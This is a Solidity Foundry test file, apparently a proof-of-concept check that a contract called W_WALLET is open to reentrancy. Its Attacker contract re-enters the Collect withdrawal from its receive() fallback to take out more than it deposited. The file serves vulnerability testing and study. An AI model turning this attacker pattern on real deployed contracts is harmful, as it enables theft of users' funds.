
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/Test.sol";
import {W_WALLET} from "../src/W_WALLET.sol";
import {Log} from "../src/W_WALLET.sol";

contract TestReentrancyW_WALLET is Test {

    W_WALLET public _contractUnderTest;
    Log public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new Log();
        _contractUnderTest = new W_WALLET(address(logFile));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 depositVal) public {
        
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);
        vm.assume(depositVal >= attackVal * 2 && depositVal < type(uint128).max);

        vm.deal(address(_attacker), depositVal * 2);
        vm.deal(address(this), depositVal * 2);

        _attacker.setupAttack{value: depositVal}(depositVal);
        vm.warp(block.timestamp + 1);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    W_WALLET public _victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = W_WALLET(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;
        storedAttackVal = val;
        _victim.Collect(val);
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
